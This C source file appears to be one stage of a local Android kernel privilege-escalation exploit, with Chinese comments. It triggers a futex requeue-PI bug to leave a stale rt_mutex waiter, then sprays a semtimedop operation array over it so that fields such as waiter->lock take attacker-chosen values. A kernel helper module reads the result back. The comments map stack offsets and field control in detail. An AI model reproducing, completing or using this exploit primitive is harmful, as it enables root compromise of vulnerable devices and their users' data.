/* SPDX-License-Identifier: GPL-3.0-or-later */

/* 验证 semtimedop 路径下 waiter->lock 是否 32 位全可控（P4.45）
 *
 * 零风险：不触发 rt_mutex_adjust_prio_chain，只用模块 kread 回读 waiter+0x2C。
 *
 * 几何（实测 D）：
 *   semop      : fast_sops = stack+0x1DE8, waiter = stack+0x1DF8 → 数组 = waiter-0x10
 *   semtimedop : fast_sops = stack+0x1DF8, waiter = stack+0x1DF8 → 数组 = waiter+0x00
 *
 * 于是字段映射完全不同（数组基址 = waiter）：
 *   +0x00 prio           = ops[0].sem_num(0) | ops[0].sem_op<<16  (阻塞项 → 0xffff0000)
 *   +0x04 prio_list.next = ops[0].sem_flg | ops[1].sem_num(0)<<16 → 0x0000XXXX
 *   +0x08 prio_list.prev = ops[1].sem_op  | ops[1].sem_flg<<16    → 32 位全可控
 *   +0x0C node_list.next = ops[2].sem_num(0) | ops[2].sem_op<<16  → 0xXXXX0000
 *   +0x10 node_list.prev = ops[2].sem_flg | ops[3].sem_num(0)<<16 → 0x0000XXXX
 *   +0x28 task           = ops[6].sem_flg | ops[7].sem_num(0)<<16 → 0x0000XXXX
 *   +0x2C lock           = ops[7].sem_op  | ops[7].sem_flg<<16    → 32 位全可控 ★
 *
 * 用法：/data/local/tmp/ktool root /data/local/tmp/sem_tv
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <sys/ipc.h>
#include <sys/sem.h>
#include <sys/types.h>
#include <time.h>
#include <errno.h>
#include <stdint.h>
#include <fcntl.h>
#include <stdarg.h>
#include <sched.h>

#ifndef SYS_syslog
#define SYS_syslog 103
#endif
#define SYSLOG_ACTION_READ_ALL	3

#define FUTEX_WAIT_REQUEUE_PI	11
#define FUTEX_CMP_REQUEUE_PI	12
#define FUTEX_LOCK_PI		6

#define SEMOPS		32
#define W_STACK_OFF	0x1DF8u

/* 故意选一个非 64KB 对齐、也不像内核地址的值 */
#define TEST_LOCK	0xdeadbeefu

static uint32_t u1, u2, u3, u4;
static volatile int a_started, b_locked_u2, a_tid;
static volatile int a_ret = 999, a_err, c_ret = 999, c_err;
static int g_semid = -1, g_sig[2];
static struct sembuf sops[SEMOPS];
static FILE *lg;
static uint32_t g_stack, g_waiter;
static char *g_kbuf;

static void logf_(const char *fmt, ...)
{
	va_list ap;
	char buf[512];
	int n;

	va_start(ap, fmt);
	n = vsnprintf(buf, sizeof buf, fmt, ap);
	va_end(ap);
	if (lg) { fwrite(buf, 1, n, lg); fflush(lg); fsync(fileno(lg)); }
	write(1, buf, n);
}

static int futex(uint32_t *u, int op, uint32_t val, const struct timespec *to,
		 uint32_t *u2p, uint32_t val3)
{
	return syscall(SYS_futex, u, op, val, to, u2p, val3);
}

static void pin_cpu(int cpu)
{
	cpu_set_t s;
	CPU_ZERO(&s); CPU_SET(cpu, &s);
	sched_setaffinity(0, sizeof s, &s);
}

/* semtimedop 映射：数组基址 = waiter */
static void build_sops_semt(void)
{
	int i;

	memset(sops, 0, sizeof sops);
	for (i = 0; i < SEMOPS; i++)
		sops[i].sem_num = 0;
	sops[0].sem_op = -1;			/* 阻塞；同时给出 prio=0xffff0000 */

	/* +0x04 prio_list.next（只能 0x0000XXXX）——验证阶段随便给 */
	sops[0].sem_flg = (short)0x2000;

	/* +0x08 prio_list.prev —— 32 位全可控 */
	sops[1].sem_op  = (short)0x3000;
	sops[1].sem_flg = 0;

	/* +0x0C node_list.next（只能 0xXXXX0000）*/
	sops[2].sem_op = 0;

	/* +0x10 node_list.prev（0x0000XXXX）*/
	sops[2].sem_flg = (short)0x4000;

	/* +0x28 task（0x0000XXXX）*/
	sops[6].sem_flg = (short)0x5000;

	/* +0x2C lock —— 32 位全可控 ★ */
	sops[7].sem_op  = (short)(TEST_LOCK & 0xffff);
	sops[7].sem_flg = (short)((TEST_LOCK >> 16) & 0xffff);
}

static int kread_via_module(uint32_t addr, int len)
{
	char cmd[64];
	int fd, n, w;

	fd = open("/dev/ktool", O_WRONLY);
	if (fd < 0) {
		logf_("[!] open /dev/ktool errno=%d\n", errno);
		return -1;
	}
	n = snprintf(cmd, sizeof cmd, "kread %x %d", addr, len);
	w = (int)write(fd, cmd, n);
	close(fd);
	logf_("[K] kread %#x len=%d -> %d/%d errno=%d\n", addr, len, w, n, errno);
	return (w == n) ? 0 : -1;
}

static int ask_stack(uint32_t tid, uint32_t *st)
{
	char cmd[64];
	int fd, n, w;
	long r;
	char *p, *last = NULL;
	const char *key = "ktool:   task->stack=";

	fd = open("/dev/ktool", O_WRONLY);
	if (fd < 0) return -1;
	n = snprintf(cmd, sizeof cmd, "waiter %u", tid);
	w = (int)write(fd, cmd, n);
	close(fd);
	if (w != n) return -1;
	usleep(60000);

	r = syscall(SYS_syslog, SYSLOG_ACTION_READ_ALL, g_kbuf, (1 << 20) - 1);
	if (r <= 0) return -1;
	g_kbuf[r] = 0;
	p = g_kbuf;
	while ((p = strstr(p, key)) != NULL) { last = p; p++; }
	if (!last) return -1;
	last += strlen(key);
	return (sscanf(last, "%x", st) == 1) ? 0 : -1;
}

/* A：futex 造 waiter -> 返回 -> 立即 semtimedop 阻塞（数组覆盖 waiter） */
static void *thread_a(void *arg)
{
	struct timespec ts;
	char c = 'x';
	int r;

	(void)arg;
	pin_cpu(0);
	a_tid = syscall(SYS_gettid);

	futex(&u4, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
	futex(&u3, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
	a_started = 1;
	__sync_synchronize();

	clock_gettime(CLOCK_MONOTONIC, &ts);
	ts.tv_sec += 2;
	ts.tv_nsec += 300 * 1000 * 1000;
	while (ts.tv_nsec >= 1000000000) { ts.tv_sec++; ts.tv_nsec -= 1000000000; }

	r = futex(&u1, FUTEX_WAIT_REQUEUE_PI, 0, &ts, &u2, 0);
	a_ret = r; a_err = errno;

	write(g_sig[1], &c, 1);

	/* 数组落在 stack+0x1DF8，正好覆盖 waiter */
	{
		struct timespec to;
		to.tv_sec = 600; to.tv_nsec = 0;
		syscall(SYS_semtimedop, g_semid, sops, SEMOPS, &to);
	}
	for (;;) __sync_synchronize();
	return NULL;
}

static void *thread_b(void *arg)
{
	(void)arg;
	pin_cpu(1);
	nice(19);
	futex(&u2, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
	b_locked_u2 = 1;
	__sync_synchronize();
	futex(&u3, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
	return NULL;
}

int main(void)
{
	char c;
	pthread_t ta, tb;

	setvbuf(stdout, NULL, _IONBF, 0);
	lg = fopen("/data/local/tmp/tv.log", "w");

	if (pipe(g_sig) != 0) return 1;
	g_kbuf = malloc(1 << 20);
	if (!g_kbuf) return 1;

	g_semid = semget(IPC_PRIVATE, 1, 0666 | IPC_CREAT);
	if (g_semid < 0) { logf_("[!] semget errno=%d\n", errno); return 1; }
	semctl(g_semid, 0, SETVAL, 0);

	build_sops_semt();

	logf_("=== sem_tv pid=%d semid=%d TEST_LOCK=%#x ===\n",
	      getpid(), g_semid, TEST_LOCK);

	pthread_create(&ta, NULL, thread_a, NULL);
	while (!a_started) usleep(1000);
	usleep(150000);
	pthread_create(&tb, NULL, thread_b, NULL);
	while (!b_locked_u2) usleep(1000);
	usleep(250000);

	c_ret = futex(&u1, FUTEX_CMP_REQUEUE_PI, 1, NULL, &u2, 0);
	c_err = errno;
	logf_("[C] CMP_REQUEUE_PI=%d errno=%d %s\n", c_ret, c_err,
	      (c_ret < 0 && c_err == 35) ? "*** EDEADLK ***" : "(?)");

	if (read(g_sig[0], &c, 1) != 1) { logf_("[!] sig fail\n"); return 1; }
	usleep(250000);		/* 等 A 落进 semtimedop */

	logf_("[A] futex=%d/%d tid=%d\n", a_ret, a_err, (int)a_tid);

	if (ask_stack((uint32_t)a_tid, &g_stack) != 0) {
		logf_("[!] 拿不到 stack\n");
		logf_("*** RESULT: ABORT ***\n");
		return 2;
	}
	g_waiter = g_stack + W_STACK_OFF;
	logf_("[L] stack=%#x waiter=%#x  (数组基址应等于 waiter)\n",
	      g_stack, g_waiter);

	/* 回读 waiter 前 0x40 字节，重点看 +0x2C */
	kread_via_module(g_waiter, 0x40);

	logf_("*** RESULT: 看 dmesg 里 %#x 处的值是否 == %#x ***\n",
	      g_waiter + 0x2C, TEST_LOCK);
	sleep(1);
	return 0;
}
